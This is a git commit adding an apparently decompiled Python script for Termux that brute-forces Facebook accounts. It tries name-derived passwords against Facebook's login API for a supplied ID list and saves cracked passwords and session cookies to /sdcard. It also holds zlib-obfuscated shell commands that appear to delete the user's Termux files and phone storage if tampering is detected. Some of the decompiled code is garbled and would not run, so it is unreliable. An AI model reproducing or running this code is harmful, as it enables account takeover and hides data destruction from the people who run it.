f85cb200e3f72b4b70893732c6073e35e7f95618
Syber king sakib <sakibhasan72465@gmail.com>
2024-11-09 20:39:25 +0600

    Add files via upload

---
+++ sakibul 2.py
@@ -0,0 +1,265 @@
+#Decode BY : SAKIB 🤣
+#SEND BY : SAKIB 
+#TG BY : https://t.me/sybertheprohacker
+import os
+import requests
+import random
+import time
+import sys
+import requests
+import uuid
+import mechanize
+import zlib
+import base64
+from concurrent.futures import ThreadPoolExecutor as loda
+first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if 'print' not in open(first + 'sessions.py', 'r').read():
+    pass
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+print('\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Bro Turn Off Protecter...! Then Run Tool')
+exit()
+first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if 'BHATTI' not in open(first + 'models.py', 'r').read():
+    pass
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+print('\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Dont Try Bypass & Capture Mother Fucker...! \n\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Your System fucked By BHATTI')
+exit()
+
+def clr():
+    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+    os.system('termux-setup-storage')
+    data = os.listdir('/sdcard')
+    if 'Android' in data:
+        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+        print('\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Dont Try Bypass & Capture Mother Fucker...! \n\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Your System fucked By BHATTI')
+        exit()
+        return None
+    exit()
+    return None
+    exit()
+
+from os import path, system
+if path.isfile('/data/data/com.termux/files/usr/bin/rm'):
+    pass
+print('\x1b[92;1m ❲\x1b[97;1m+\x1b[92;1m❳\x1b[97;1m Bro Turn Off Protecter...! Then Run Tool')
+exit()
+from requests import api
+x = open(api.__file__, 'r').read()
+if 'print' in x:
+    clr()
+if 'sys.stdout.write' in x:
+    clr()
+from requests import sessions
+x = open(sessions.__file__, 'r').read()
+if 'print' in x:
+    clr()
+if 'sys.stdout.write' in x:
+    clr()
+from requests import models
+x = open(models.__file__, 'r').read()
+if 'print' in x:
+    clr()
+if 'sys.stdout.write' in x:
+    clr()
+import mechanize
+oks = []
+cps = []
+plist = []
+methods = []
+speed = []
+twf = []
+loop = 0
+os.system('xdg-open https://t.me/sybertheprohacker')
+logo = '\n \x1b[92;1m██\x1b[97;1m╗  \x1b[92;1m██\x1b[97;1m╗\x1b[92;1m██\x1b[97;1m╗   \x1b[92;1m██\x1b[97;1m╗\x1b[92;1m███████\x1b[97;1m╗\n \x1b[97;1m╚\x1b[92;1m██\x1b[97;1m╗\x1b[92;1m██\x1b[97;1m╔╝╚\x1b[92;1m██\x1b[97;1m╗ \x1b[92;1m██\x1b[97;1m╔╝╚══\x1b[92;1m███\x1b[97;1m╔╝\n \x1b[97;1m ╚\x1b[92;1m███\x1b[97;1m╔╝  ╚\x1b[92;1m████\x1b[97;1m╔╝   \x1b[92;1m███\x1b[97;1m╔╝ \n  \x1b[92;1m██\x1b[97;1m╔\x1b[92;1m██\x1b[97;1m╗   ╚\x1b[92;1m██\x1b[97;1m╔╝   \x1b[92;1m███\x1b[97;1m╔╝  \n \x1b[92;1m██\x1b[97;1m╔╝ \x1b[92;1m██\x1b[97;1m╗  \x1b[92;1m ██\x1b[97;1m║   \x1b[92;1m███████\x1b[97;1m╗\n \x1b[97;1m╚═╝  ╚═╝   ╚═╝   ╚══════╝\n-------------------------------------------\nOwner  :     Mudassar Ali\nTeam   :     https://t.me/KGF_TERMUX_TEAM \nVersion:      0.2\nTool   :        Free Trail                 \n-----------------------------------------------'
+
+def linex():
+    print('\x1b[1;37m-----------------------------------------------')
+
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+
+def menu():
+    os.system('clear')
+    print(logo)
+    print('[1] File Cloning')
+    print('[2] Join Whatsapp Group')
+    print('{TG} https://t.me/KGF_TERMUX_TEAM ')
+    linex()
+    lomda = input('\x1b[1;37mChoose Option : ')
+    if lomda in ('1',):
+        clear()
+        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
+        linex()
+        file = input('Enter File Name\x1b[1;37m: ')
+        fo = open(file, 'r').read().splitlines()
+        clear()
+        print('[1] METHOD 1')
+        print('[2] METHOD 2')
+        linex()
+        mthd = input('CHOOSE : ')
+        linex()
+        clear()
+        plist = []
+        ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
+        linex()
+        clear()
+        print('\x1b[1;37m EXAMPLE : first last,firtslast')
+        linex()
+        for i in range(ps_limit):
+            plist.append(input(f'''PUT PASSWORD {i + 1}: '''))
+            linex()
+            clear()
+            crack_submit = loda(max_workers = 30)
+            clear()
+            total_ids = str(None(len))
+            print(' TOTAL ACCOUNT : \x1b[1;32m' + total_ids + ' ')
+            print('\x1b[1;37m CRACKING STARTED...\x1b[1;37m')
+            linex()
+            for user in fo:
+                (ids, names) = user.split('|')
+                passlist = plist
+                if mthd in ('1', '01'):
+                    crack_submit.submit(ffb, ids, names, passlist)
+                if not mthd in ('2', '02'):
+                    pass
+                crack_submit.submit(ffb1, ids, names, passlist)
+                None(None, None)
+                print('\x1b[1;37m')
+                linex()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
+                linex()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python XYZ.py')
+                return None
+                if lomda in ('2',):
+                    os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
+                    return None
+    menu()
+    return None
+    if FileNotFoundError:
+        print('FILE NOT FOUND ')
+        time.sleep(2)
+        menu()
+    ps_limit = 1
+    if not None:
+        pass
+
+
+def ffb(ids, names, passlist):
+    global loop
+    sys.stdout.write(f'''\r\r\x1b[1;37m [XYZ-M1] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
+    sys.stdout.flush()
+    fn = names.split(' ')[0]
+    ln = names.split(' ')[1]
+    for pw in passlist:
+        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
+        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/Orca-Android;FBAV/196.0.0.73;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/228142950;FBCR/TELKOMSEL;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO LH6n;FBSV/11.0.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2208};FB_FW/1;FBRV/201718973]'
+        head = {
+            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
+        data = {
+            'locale': 'fr_FR',
+            'client_country_code': 'FR',
+            'fb_api_req_friendly_name': 'authenticate',
+            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+            'access_token': accees_token }
+        url = 'https://b-graph.facebook.com/auth/login'
+        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
+        po = requests.post(url, data = data, headers = head).json()
+        if 'session_key' in po:
+            print('\r\r\x1b[1;32m [XYZ-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
+            coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(po['session_cookies']())
+            open('/sdcard/XYZ-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+            open('/sdcard/XYZ-OK.txt', 'a').write(ids + '|' + pas + '\n')
+            oks.append(ids)
+            ';'.join
+        if twf in str(po):
+            print('\r\r \x1b[1;34m[XYZ-2F] ' + ids + ' | ' + pas)
+            twf.append(ids)
+        if 'www.facebook.com' in po['error']['message']:
+            print('\r\r\x1b[1;31m [XYZ-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
+            open('/sdcard/XYZ-CP.txt', 'a').write(ids + '|' + pas + '\n')
+            cps.append(ids)
+            '0'
+    loop += 1
+    return None
+    'currently_logged_in_userid'
+    ln = fn
+    if Exception:
+        e = '1'
+        time.sleep(20)
+        e = None
+        del e
+        return None
+        e = None
+        del e
+
+
+def ffb1(ids, names, passlist):
+    global loop
+    sys.stdout.write(f'''\r\r\x1b[1;37m [XYZ-M2] {loop!s}|\x1b[1;37mOK:-{len(oks)!s} \x1b[1;37m''')
+    sys.stdout.flush()
+    fn = names.split(' ')[0]
+    ln = names.split(' ')[1]
+    for pw in passlist:
+        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
+        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/Orca-Android;FBAV/196.0.0.51;FBPN/com.facebook.orca;FBLC/en_US;FBBV/468920698;FBCR/Meteor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1939;FBSV/7.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;FBRV/532343281]'
+        head = {
+            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
+        data = {
+            'locale': 'pt_BR',
+            'client_country_code': 'BR',
+            'fb_api_req_friendly_name': 'authenticate',
+            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
+            'access_token': accees_token }
+        url = 'https://b-graph.facebook.com/auth/login'
+        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
+        po = requests.post(url, data = data, headers = head).json()
+        if 'session_key' in po:
+            print('\r\r\x1b[1;32m [XYZ-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
+            coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(po['session_cookies']())
+            open('/sdcard/XYZ-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
+            open('/sdcard/XYZ-OK.txt', 'a').write(ids + '|' + pas + '\n')
+            oks.append(ids)
+            ';'.join
+        if twf in str(po):
+            print('\r\r \x1b[1;34m[XYZ-2F] ' + ids + ' | ' + pas)
+            twf.append(ids)
+        if 'www.facebook.com' in po['error']['message']:
+            print('\r\r\x1b[1;31m [XYZ-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
+            open('/sdcard/XYZ-CP.txt', 'a').write(ids + '|' + pas + '\n')
+            cps.append(ids)
+            '0'
+    loop += 1
+    return None
+    'currently_logged_in_userid'
+    ln = fn
+    if Exception:
+        e = '1'
+        time.sleep(20)
+        e = None
+        del e
+        return None
+        e = None
+        del e
+
+menu()
+return None
+if ModuleNotFoundError:
+    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
+os.system(base64.b64decode(base64.b64decode('Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=')))
